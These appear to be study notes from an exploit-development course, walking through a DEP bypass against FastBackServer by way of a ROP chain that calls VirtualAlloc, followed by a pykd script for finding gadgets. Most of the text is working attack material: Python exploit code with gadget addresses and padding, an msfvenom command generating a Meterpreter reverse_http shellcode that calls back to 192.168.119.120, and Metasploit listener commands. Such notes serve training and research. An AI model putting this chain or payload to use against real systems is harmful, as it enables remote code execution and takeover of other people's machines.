This is expected and intended since the gadget that moves EBP into ESP contains a "POP EBP" instruction, which increments the stack pointer by four bytes. This is why we aligned EAX to point four bytes before the VirtualAlloc address.

the second half of the ROP chain, which executes VirtualAlloc.
	p
	p
	p
	p
	p
	p



Let's check the memory protections of the shellcode address before and after executing the API.



The final step required is to align our shellcode with the return address. Instead of modifying the offsets used in the ROP chain, we could also insert several padding bytes before the shellcode.

To find the number of padding bytes we need, we return out of VirtualAlloc and obtain the address of the first instruction we are executing on the stack. Next, we dump the contents of the stack and obtain the address of where our ROP chain ends in order to obtain its address and calculate the difference between the two.
	p
	dd esp + 100
	? 0d55e514  - 0d55e434



The calculation indicates we need 224 bytes of padding. Now we can update the proof of concept to include padding and a dummy shellcode after the ROP chain. This will help us verify that everything is setup correctly before including the real payload.

rop = pack("<L", (0x5050118e)) # mov eax,esi ; pop esi ; retn
...
rop += pack("<L", (0x50533cbf)) # mov esp, ebp ; pop ebp ; ret

padding = b"C" * 0xe0

shellcode = b"\xcc" * (0x400 - 276 - 4 - len(rop) - len(padding))

formatString = b"File: %s From: %d To: %d ChunkLoc: %d FileLoc: %d" % (offset+va+eip+rop+padding+shellcode,0,0,0,0)
buf += formatString

At this point, everything is aligned and we can execute the dummy shellcode by single-stepping through it.
	bp KERNEL32!VirtualAllocStub
	g
	pt
	p
	p
	p
	p
	
The execution on the stack doesn't trigger any access violation. Congratulations, we succeeded in using ROP to bypass DEP!

Getting a Reverse Shell

First, let's determine how much space we have available for our shellcode. When VirtualAlloc completes execution and we return into our dummy shellcode, we can dump memory at EIP to find the exact amount of space available
	dd eip L40
	? 0d5ae604 - eip
	


We only have 240 bytes available, which is likely not enough for a reverse shellcode.

Luckily, we have the freedom to increase the buffer size. If we increase it from 0x400 to 0x600 bytes, we can compensate for a larger payload size.

We use msfvenom to generate the shellcode, remembering to supply the bad characters with the -b option.

	msfvenom -p windows/meterpreter/reverse_http LHOST=192.168.119.120 LPORT=8080 -b "\x00\x09\x0a\x0b\x0c\x0d\x20" -f python -v shellcode
	

From the highlighted payload size in Listing 83, we find that, due to the encoding, the shellcode takes up 544 bytes.

Now, we just need to insert the shellcode into the proof of concept, and we have our final exploit code. Before we execute the complete exploit, we will set up a Metasploit multi/handler listener to catch our shell.
	use multi/handler
	set payload windows/meterpreter/reverse_http
	set lhost 192.168.119.120
	set lport 8080
	exploit
	getuid
	








----------------------------------------------------------------------------------------------------
With pykd
Write a python script:
	from pykd import *
	dprintln("Hello World!")

Load and run the python script
	.load pykd
	!py C:\Tools\pykd\HelloWorld.py
	
Now using pykd we can search for page_execute, page_execute_read, page_execute_readwrite, and page_execute_writecopy
	from pykd import *
	
	PAGE_SIZE = 0x1000
	
	MEM_ACCESS_EXE = {
	0x10  : "PAGE_EXECUTE"                                                     ,
	0x20  : "PAGE_EXECUTE_READ"                                                ,
	0x40  : "PAGE_EXECUTE_READWRITE"                                           ,
	0x80  : "PAGE_EXECUTE_WRITECOPY"                                           ,
	}
	
	def isPageExec(address):
	 try:
	     protect = getVaProtect(address)
	 except:
	     protect = 0x1
	 if protect in MEM_ACCESS_EXE.keys():
	     return True
	 else:
	     return False
	
	if __name__ == '__main__':
	 count = 0
	 try:
	     modname = sys.argv[1].strip()
	 except IndexError:
	     print("Syntax: findrop.py modulename")
	     sys.exit()
	
	 mod = module(modname)
	 pages = []
	
	 if mod:
	    pn = int((mod.end() - mod.begin()) / PAGE_SIZE)
	    print("Total Memory Pages: %d" % pn)
	    
	    for i in range(0, pn):
	     page = mod.begin() + i*PAGE_SIZE
	     if isPageExec(page):
	         pages.append(page)
	    print("Executable Memory Pages: %d" % len(pages))
	
Now save and run:
	!py C:\Tools\pykd\findrop FastBackServer
	
Now updated script with this funciton to find return opcodes:
	def findRetn(pages):
	 retn = []
	 for page in pages:
	     ptr = page
	     while ptr < (page + PAGE_SIZE):
	         b = loadSignBytes(ptr, 1)[0] & 0xff
	         if b not in [0xc3, 0xc2]:
	             ptr += 1
	             continue
	         else:
	             retn.append(ptr)
	             ptr += 1
	             
	 print("Found %d ret instructions" % len(retn))
	 return retn
	
And run:
	!py C:\Tools\pykd\findrop FastBackServer
	

	
	
	

![image](https://github.com/user-attachments/assets/12e3c5e8-3b39-4a55-a9f7-256a983b06e4)
